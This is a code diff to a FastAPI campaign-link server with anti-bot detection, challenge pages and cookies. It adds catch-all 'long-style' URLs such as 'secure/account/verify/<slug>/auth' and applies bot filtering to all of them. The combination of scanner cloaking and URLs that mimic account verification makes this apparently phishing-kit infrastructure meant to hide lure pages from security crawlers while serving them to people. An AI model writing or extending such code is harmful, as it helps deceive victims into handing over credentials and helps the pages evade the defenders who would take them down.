@@ -37,7 +37,7 @@ from backend.mime import guess_inline_content_type
 from backend.rate_limit import login_rate_limiter
 import backend.storage_supabase as storage_sb
 from backend.storage import StorageError
-from backend.utils import generate_slug, slugify
+from backend.utils import generate_slug, slugify, build_url_template, make_public_url_for_slug
 from backend.antibot.detector import detect_bot
 from backend.antibot.cookies import COOKIE_NAME, make_cookie, verify_cookie
 from backend.antibot.challenge import make_challenge_token, verify_challenge_token, render_challenge_page
@@ -213,13 +213,24 @@ if FRONTEND_DIR.exists():
 # Anti-bot middleware
 # ──────────────────────────────────────────────
 
+# Regex to extract a 32-char alphanumeric slug embedded anywhere in a URL path.
+# This is used to apply antibot protection and serve campaigns via long-style URLs.
+_SLUG_RE_32 = re.compile(r"/([A-Za-z0-9]{32})(?:/|$)")
+
+
 @app.middleware("http")
 async def antibot_middleware(request: Request, call_next):
-    """Layer 1 + Layer 2 anti-bot protection for /c/* campaign routes."""
+    """Layer 1 + Layer 2 anti-bot protection for campaign routes."""
     path = request.url.path
 
-    # Only apply on /c/… campaign routes
-    if not path.startswith("/c/"):
+    # Skip known non-campaign paths
+    if (
+        path == "/"
+        or path.startswith("/static/")
+        or path.startswith("/healthz")
+        or path.startswith("/api/")
+        or path.startswith(settings.ADMIN_PATH_PREFIX)
+    ):
         return await call_next(request)
 
     # Skip the _verify endpoint itself (handled by its own route)
@@ -229,15 +240,22 @@ async def antibot_middleware(request: Request, call_next):
     if not settings.ANTIBOT_ENABLED:
         return await call_next(request)
 
-    # Extract slug from path: /c/<slug>/…
-    parts = path.split("/")
-    slug = parts[2] if len(parts) > 2 and parts[2] else None
+    # Extract slug from path.
+    # Old style: /c/<slug>/…  →  parts[2]
+    # New style: /<prefix>/<32-char-slug>/<suffix>  →  regex match
+    slug: Optional[str] = None
+    if path.startswith("/c/"):
+        parts = path.split("/")
+        slug = parts[2] if len(parts) > 2 and parts[2] else None
+    else:
+        match = _SLUG_RE_32.search(path)
+        if match:
+            slug = match.group(1)
+
     if not slug:
         return await call_next(request)
 
     # Fast pre-check: UA + headers before any DB lookup.
-    # This catches the most obvious bots without touching the database.
-    # Use "light" level to skip rate limiting (handled in the full check below).
     fast_check = detect_bot(request, "light")
     if fast_check.is_bot:
         asyncio.create_task(_log_bot_hit_async(request, slug, fast_check))
@@ -358,10 +376,8 @@ class LoginBody(BaseModel):
 # Helpers
 # ──────────────────────────────────────────────
 
-def _make_full_url(slug: str, domain: Optional[str]) -> str:
-    if domain:
-        return f"https://{domain}/c/{slug}/"
-    return f"{settings.PUBLIC_BASE_URL}/c/{slug}/"
+def _make_full_url(slug: str, domain: Optional[str], url_template: Optional[str] = None) -> str:
+    return make_public_url_for_slug(slug, domain, url_template)
 
 
 def _link_out(link: dict) -> LinkOut:
@@ -372,7 +388,7 @@ def _link_out(link: dict) -> LinkOut:
         domain=link.get("domain"),
         total_clicks=stats.get("total_clicks", 0),
         is_active=link.get("is_active", True),
-        full_url=_make_full_url(link["slug"], link.get("domain")),
+        full_url=_make_full_url(link["slug"], link.get("domain"), link.get("url_template")),
     )
 
 
@@ -527,7 +543,7 @@ async def verify_challenge(slug: str, body: VerifyBody, request: Request):
         httponly=True,
         samesite="lax",
         secure=secure,
-        path=f"/c/{slug}",
+        path="/",
     )
     return response
 
@@ -841,8 +857,9 @@ def create_link(campaign_id: int, body: NewLinkBody):
             )
 
     slug = _unique_slug()
-    link = dao.create_link(slug, campaign_id, domain)
-    return {"slug": slug, "full_url": _make_full_url(slug, domain)}
+    url_template = build_url_template(slug)
+    link = dao.create_link(slug, campaign_id, domain, url_template=url_template)
+    return {"slug": slug, "full_url": _make_full_url(slug, domain, url_template)}
 
 
 @admin_router.delete("/api/links/{slug}", dependencies=[Depends(require_auth)])
@@ -959,5 +976,44 @@ async def bot_test():
         )
 
 
+
 # Include the admin router with the configured prefix
 app.include_router(admin_router, prefix=settings.ADMIN_PATH_PREFIX)
+
+
+# ──────────────────────────────────────────────
+# Catch-all route for long-style campaign URLs
+# ──────────────────────────────────────────────
+# MUST be registered AFTER all other routes (admin, /c/*, /healthz, /api/…)
+# so it does not shadow them.
+
+@app.get("/{full_path:path}", include_in_schema=False)
+async def serve_long_url(full_path: str, request: Request):
+    """Serve a campaign for any long-style URL containing a 32-char slug.
+
+    Extracts the slug via regex from paths like::
+
+        secure/account/verify/<slug>/auth
+        portal/document/track/<slug>/confirm
+
+    Sub-resources that look like real files (containing a ``.`` in the last
+    segment) are forwarded to the campaign file handler so assets (images,
+    CSS, JS) are served correctly.
+    """
+    match = _SLUG_RE_32.search("/" + full_path)
+    if not match:
+        raise HTTPException(status_code=404, detail="Page introuvable")
+    slug = match.group(1)
+
+    # The portion of the path that comes *after* the slug (and after any
+    # trailing separator).  match.end() points past the slug; skip the leading "/".
+    after_slug = ("/" + full_path)[match.end():].lstrip("/")
+    last_segment = after_slug.split("/")[-1] if after_slug else ""
+    if after_slug and "." in last_segment:
+        # Looks like an asset path (e.g. "images/logo.png")
+        file_path = after_slug
+    else:
+        # Decorative suffix — serve the campaign entry file
+        file_path = ""
+
+    return await _serve_campaign_file(slug, file_path, request)
